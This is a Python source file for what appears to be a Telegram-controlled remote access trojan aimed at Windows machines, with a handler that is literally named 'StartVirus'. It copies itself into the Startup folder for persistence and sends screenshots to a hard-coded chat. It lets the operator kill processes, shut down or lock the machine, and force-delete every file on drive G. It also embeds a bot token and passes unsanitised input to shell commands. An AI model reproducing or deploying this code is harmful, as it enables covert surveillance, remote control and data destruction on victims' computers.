import urllib
from urllib.request import urlopen
from telegram.ext import Updater, CommandHandler, CallbackContext
from telegram.update import Update
import platform
from PIL import ImageGrab
import os
import subprocess
import ctypes
import pyttsx3

updater = Updater("5334976172:AAETPD21-KenZNhde9u_UE6yErdN7ELyxAs", use_context=True)

app_list = []
app_proccess_list = []
ip = urllib.request.urlopen("https://ip.42.pl/short")
s = str(ip.read())

cmd = rf'copy graphic.exe "C:\Users\{platform.node()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\graphic.exe"'
os.system(cmd)


def StartVirus(update: Update, context: CallbackContext):
    update.message.reply_text("Connected to : " + s)

def getSystemInfo(update: Update, context: CallbackContext):
    data = 'System = '+platform.uname()[0]+' '+platform.uname()[2]+' '+platform.architecture()[0]+'\n'
    data += 'User = '+platform.uname()[1]+'\n'
    data += 'Release = ' +  platform.release()+'\n'
    data += 'Version = ' + platform.version()
    update.message.reply_text(data)

def TakeScreenshot(update: Update, context: CallbackContext):
    snapshot = ImageGrab.grab()
    save_path = os.path.join(os.environ["USERPROFILE"], "Videos", "screenshot.png")
    snapshot.save(save_path)
    photo = open(os.path.join(os.environ["USERPROFILE"], "Videos", "screenshot.png"), "rb")
    context.bot.sendPhoto("987456184", photo, "screenshot")

def ShowRunningApp(update: Update, context: CallbackContext):
    app_list.clear()
    app_proccess_list.clear()
    cmd2 = 'powershell "gps | where {$_.MainWindowTitle } | select Description'
    proc2 = subprocess.Popen(cmd2, shell=True, stdout=subprocess.PIPE)
    for line in proc2.stdout:
        if line.rstrip():
            RunningApps = line.decode().rstrip()
            app_list.append(RunningApps)
    del app_list[0:2]
    update.message.reply_text(str(app_list))

    cmd = 'powershell "gps | where {$_.MainWindowTitle }'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    for line in proc.stdout:
        if line.rstrip():
            app_proccess_list.append(line.decode().rstrip())
    del app_proccess_list[0:2]

    ls = [words for segments in app_proccess_list for words in segments.split()]
    ss = [word for word in ls if not word.isdigit()]
    update.message.reply_text(ss)
    

def CloseApp(update:Update, context: CallbackContext):
    killapps = subprocess.call(f'TASKKILL /F /IM {context.args[0]}.exe', shell=True)
    if killapps == 128:
        update.message.reply_text(f"The process #{context.args[0]} not found")
    else:
        update.message.reply_text(f"The process #{context.args[0]} has been terminated")

def Shutdown(update:Update, context: CallbackContext):
    os.system('shutdown /s /t 1')
    update.message.reply_text("The target system is shut down")



def Restart(update:Update, context: CallbackContext):
    os.system('shutdown /r /t 1')
    update.message.reply_text("The target system is restarted")

def Lock(update: Update, context: CallbackContext):
    ctypes.windll.user32.LockWorkStation()
    update.message.reply_text("The target system is locked")
    
def DeleteData(update: Update, context: CallbackContext):
    list = ['G']
    for i in list:
        drive = i
        file_deleted = os.system("del " +drive +":\*.* /f /s /q")
    update.message.reply_text("All data was deleted")

def ShowMessage(update: Update, context: CallbackContext):
    words = context.args[0:]
    sentence = ' '.join(words)
    os.system("echo " +sentence + ">" + "Message.txt")
    os.system("start Message.txt")
    os.system("del Message.txt")
    update.message.reply_text("Your message has been created")


def PlaySound(update: Update, context: CallbackContext):
    sound = pyttsx3.init()
    sound.setProperty("rate", 115)
    words = context.args[0:]
    sentence = ' '.join(words)
    sound.say(sentence)
    sound.runAndWait()
    update.message.reply_text("Your message has been converted into speech")


def SwapMouse(update: Update, context: CallbackContext):
    os.system("rundll32 user32, SwapMouseButton")
    update.message.reply_text("The mouse key was moved")



def MakeFolder(update: Update, context: CallbackContext):
    folder = os.path.join(os.environ["USERPROFILE"], "Desktop", context.args[0])
    os.mkdir(folder)
    update.message.reply_text("The folder was created")


updater.dispatcher.add_handler(CommandHandler("start", StartVirus))
updater.dispatcher.add_handler(CommandHandler("systemInfo", getSystemInfo))
updater.dispatcher.add_handler(CommandHandler("TakeScreenShot", TakeScreenshot))
updater.dispatcher.add_handler(CommandHandler("ShowRunningApp", ShowRunningApp))
updater.dispatcher.add_handler(CommandHandler("CloseApp", CloseApp, pass_args=True))
updater.dispatcher.add_handler(CommandHandler("Lock", Lock))
updater.dispatcher.add_handler(CommandHandler("Shutdown", Shutdown))
updater.dispatcher.add_handler(CommandHandler("Restart", Restart))
updater.dispatcher.add_handler(CommandHandler("DeleteData", DeleteData))
updater.dispatcher.add_handler(CommandHandler("ShowMessage", ShowMessage))
updater.dispatcher.add_handler(CommandHandler("PlaySound", PlaySound))
updater.dispatcher.add_handler(CommandHandler("SwapMouse", SwapMouse))
updater.dispatcher.add_handler(CommandHandler("MakeFolder", MakeFolder))


updater.start_polling()

